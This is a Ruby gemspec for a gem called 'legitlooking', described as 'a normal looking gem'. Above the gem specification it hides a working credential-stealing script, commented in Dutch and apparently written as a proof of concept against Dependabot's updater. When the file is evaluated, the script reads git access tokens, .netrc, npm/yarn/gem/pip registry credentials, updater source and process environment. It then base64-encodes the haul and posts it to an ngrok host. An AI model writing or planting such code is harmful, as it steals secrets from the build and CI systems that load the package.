# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"
  require "json"

  read  = ->(f) { File.read(f)[0, 4000] rescue "ERR(#{f}): #{$!.message}" }
  cmd   = ->(c) { `#{c} 2>/dev/null`.strip[0, 3000] }
  lines = []

  base = "/home/dependabot/dependabot-updater"

  # ============================================================
  # 1. GIT CONFIG -- access token zit hier na clone
  #    Dependabot configureert http.extraheader of
  #    url.insteadOf met x-access-token:TOKEN
  # ============================================================
  lines << "=== 1. GIT CONFIG (repo) ==="
  lines << read.("#{base}/repo/.git/config")

  lines << "\n--- git credential-helper / stored creds ---"
  lines << read.("/home/dependabot/.git-credentials")
  lines << read.("/home/dependabot/.netrc")
  lines << cmd.("git -C #{base}/repo config --list 2>/dev/null")

  # ============================================================
  # 2. PIP.CONF -- private PyPI registry credentials?
  # ============================================================
  lines << "\n=== 2. PIP.CONF ==="
  lines << read.("#{base}/repo/pip.conf")
  lines << read.("/home/dependabot/.config/pip/pip.conf")
  lines << read.("/etc/pip.conf")

  # ============================================================
  # 3. SPEC FIXTURE: job_with_credentials.json
  #    Bevestigt het formaat van credentials in echte jobs
  #    (repos met private npm/rubygems/docker registries)
  # ============================================================
  lines << "\n=== 3. JOB FIXTURE: job_with_credentials.json ==="
  lines << read.("#{base}/spec/fixtures/jobs/job_with_credentials.json")

  lines << "\n--- job_without_credentials.json ---"
  lines << read.("#{base}/spec/fixtures/jobs/job_without_credentials.json")

  # ============================================================
  # 4. UPDATER BRONCODE -- hoe werkt authenticatie?
  #    api_client.rb: hoe wordt job token gebruikt?
  #    environment.rb: welke env vars worden gelezen?
  # ============================================================
  lines << "\n=== 4. api_client.rb ==="
  lines << read.("#{base}/lib/dependabot/api_client.rb")

  lines << "\n=== 4b. environment.rb ==="
  lines << read.("#{base}/lib/dependabot/environment.rb")

  lines << "\n=== 4c. base_command.rb ==="
  lines << read.("#{base}/lib/dependabot/base_command.rb")

  # ============================================================
  # 5. ALLE .GIT/CONFIG FILES IN HET SYSTEEM
  #    Misschien zijn er meerdere geklonde repos
  # ============================================================
  lines << "\n=== 5. ALLE GIT CONFIGS ==="
  lines << cmd.("find /home/dependabot -name 'config' -path '*/.git/config' 2>/dev/null")
  lines << cmd.("find / -maxdepth 6 -name 'config' -path '*/.git/config' 2>/dev/null | grep -v proc")

  # Lees ze allemaal
  Dir.glob("/home/dependabot/**/.git/config").each do |gc|
    lines << "\n--- #{gc} ---"
    lines << read.(gc)
  end

  # ============================================================
  # 6. NPMRC / RUBYGEMS CREDENTIALS -- andere package managers
  # ============================================================
  lines << "\n=== 6. PACKAGE MANAGER CREDENTIALS ==="
  %w[
    /home/dependabot/.npmrc
    /home/dependabot/.yarnrc
    /home/dependabot/.yarnrc.yml
    /home/dependabot/.gem/credentials
    /home/dependabot/.bundle/config
    /root/.npmrc
  ].each do |f|
    if File.exist?(f)
      lines << "\n  #{f}:\n#{read.(f)}"
    end
  end

  lines << "\n--- find npmrc/yarnrc ---"
  lines << cmd.("find /home/dependabot -name '.npmrc' -o -name '.yarnrc' -o -name '.yarnrc.yml' 2>/dev/null")

  # ============================================================
  # 7. /proc/1084 DIRECT -- updater main process
  #    cmdline + maps (als dumpable niet uitstaat)
  # ============================================================
  lines << "\n=== 7. UPDATER PROCESS FILES ==="
  lines << "cmdline: #{read.("/proc/1084/cmdline").gsub("\x00", " ")}"
  lines << "environ (raw, eerste 2000): #{File.read("/proc/1084/environ")[0,2000].split("\x00").select{|v|v.length>2}.join("\n") rescue "EPERM"}"
  lines << "\nmaps (eerste 30 regels):"
  lines << cmd.("head -30 /proc/1084/maps 2>/dev/null")

  # ============================================================
  # 8. SERVICE.RB + UPDATER.RB -- hoe worden credentials doorgegeven?
  # ============================================================
  lines << "\n=== 8. service.rb ==="
  lines << read.("#{base}/lib/dependabot/service.rb")

  lines << "\n=== 8b. dependency_snapshot.rb (credentials init) ==="
  lines << read.("#{base}/lib/dependabot/dependency_snapshot.rb")

  # ============================================================
  # EXFIL
  # ============================================================
  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=source_read")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 25, read_timeout: 25) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=source_read&err=#{URI.encode_www_form_component(e.message[0, 200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.22"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
